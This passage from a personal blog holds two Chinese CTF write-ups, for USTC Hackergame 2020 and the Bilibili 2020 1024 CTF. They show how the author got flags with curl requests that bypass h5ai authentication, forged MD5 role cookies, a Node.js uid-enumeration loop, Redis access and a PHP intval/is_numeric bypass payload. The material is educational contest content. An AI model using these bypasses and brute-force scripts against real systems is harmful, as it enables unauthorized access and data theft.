class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 